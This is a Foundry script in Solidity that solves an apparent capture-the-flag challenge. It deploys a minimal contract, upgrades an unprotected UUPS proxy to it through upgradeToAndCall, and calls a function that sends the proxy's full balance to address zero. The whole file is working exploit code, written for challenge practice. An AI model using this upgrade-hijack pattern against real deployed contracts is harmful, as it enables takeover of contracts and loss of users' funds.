// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "forge-std/Script.sol";

interface IBetterVersion {
    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external;
}

interface ISetup {
    function betterVersion() external view returns (address);
    function isSolved() external view returns (bool);
}

contract MinimalSelfdestruct {
    bytes32 internal constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    function proxiableUUID() external pure returns (bytes32) {
        return IMPLEMENTATION_SLOT;
    }

    function bla() external {
        payable(address(0)).call{value: address(this).balance}("");
    }
}

/// @notice Foundry script to solve the challenge.
contract Solve is Script {
    function run() public {
        ISetup setup = ISetup(vm.envAddress("SETUP"));
        address target = setup.betterVersion();

        vm.startBroadcast(vm.envUint("PRIV"));

        MinimalSelfdestruct minimal = new MinimalSelfdestruct();

        IBetterVersion(target).upgradeToAndCall(address(minimal), bytes(""));

        target.call(abi.encodeWithSignature("bla()"));

        require(setup.isSolved(), "Challenge not solved");
        vm.stopBroadcast();
    }
}
